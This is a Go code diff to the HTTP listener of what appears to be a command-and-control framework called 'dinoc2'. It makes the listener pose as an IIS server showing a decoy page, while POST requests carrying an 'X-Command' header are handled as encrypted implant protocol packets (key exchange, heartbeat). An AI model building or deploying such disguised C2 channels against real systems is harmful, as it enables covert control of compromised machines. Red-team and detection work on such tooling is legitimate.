@@ -4,12 +4,15 @@ import (
 	"context"
 	"crypto/tls"
 	"fmt"
+	"io"
 	"net/http"
 	"sync"
 	"time"
 
 	"golang.org/x/net/http2"
 	"golang.org/x/net/http2/h2c"
+	"dinoc2/pkg/crypto"
+	"dinoc2/pkg/protocol"
 )
 
 // HTTPListener implements the Listener interface for HTTP/HTTP2 protocol
@@ -171,13 +174,76 @@ func (l *HTTPListener) RegisterHandler(path string, handler http.HandlerFunc) {
 
 // defaultHandler is the default HTTP handler
 func (l *HTTPListener) defaultHandler(w http.ResponseWriter, r *http.Request) {
-	// In a real implementation, this would pass the request to the protocol layer
 	fmt.Printf("Received HTTP request from %s: %s %s\n", r.RemoteAddr, r.Method, r.URL.Path)
 	
-	// Send a generic response
+	// Set common headers to mimic a regular web server
 	w.Header().Set("Server", "Microsoft-IIS/10.0")
-	w.WriteHeader(http.StatusOK)
-	w.Write([]byte("<html><body><h1>It works!</h1></body></html>"))
+	w.Header().Set("Content-Type", "text/html")
+	
+	// Check if this is a data-carrying request
+	if r.Method == "POST" && r.Header.Get("X-Command") != "" {
+		// Read the request body
+		body, err := io.ReadAll(r.Body)
+		if err != nil {
+			http.Error(w, "Error reading request body", http.StatusInternalServerError)
+			return
+		}
+		
+		// Create a protocol handler for processing the data
+		protocolHandler := protocol.NewProtocolHandler()
+		
+		// Generate a session ID based on the connection address
+		sessionID := crypto.SessionID(r.RemoteAddr)
+		
+		// Create a session with AES encryption (default)
+		err = protocolHandler.CreateSession(sessionID, crypto.AlgorithmAES)
+		if err != nil {
+			fmt.Printf("Error creating session for HTTP data: %v\n", err)
+			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
+			return
+		}
+		
+		// Decode the packet
+		packet, err := protocol.DecodePacket(body)
+		if err != nil {
+			fmt.Printf("Error decoding HTTP packet data: %v\n", err)
+			http.Error(w, "Bad Request", http.StatusBadRequest)
+			return
+		}
+		
+		// Handle packet based on type
+		var responseData []byte
+		
+		switch packet.Header.Type {
+		case protocol.PacketTypeKeyExchange:
+			fmt.Printf("Received key exchange from %s via HTTP\n", r.RemoteAddr)
+			// Create a response packet with the same session ID
+			responsePacket := protocol.NewPacket(protocol.PacketTypeKeyExchange, []byte(string(sessionID)))
+			responseData = protocol.EncodePacket(responsePacket)
+			
+		case protocol.PacketTypeHeartbeat:
+			fmt.Printf("Received heartbeat from %s via HTTP\n", r.RemoteAddr)
+			// Create a heartbeat response
+			responsePacket := protocol.NewPacket(protocol.PacketTypeHeartbeat, []byte("pong"))
+			responseData = protocol.EncodePacket(responsePacket)
+			
+		default:
+			fmt.Printf("Received packet type %d from %s via HTTP\n", packet.Header.Type, r.RemoteAddr)
+			// Echo back the packet for other types
+			responseData = protocol.EncodePacket(packet)
+		}
+		
+		// Clean up
+		protocolHandler.RemoveSession(sessionID)
+		
+		// Send the response
+		w.WriteHeader(http.StatusOK)
+		w.Write(responseData)
+	} else {
+		// Regular request, send a generic response
+		w.WriteHeader(http.StatusOK)
+		w.Write([]byte("<html><body><h1>It works!</h1></body></html>"))
+	}
 }
 
 // CreateTLSConfig creates a TLS configuration for the HTTP server
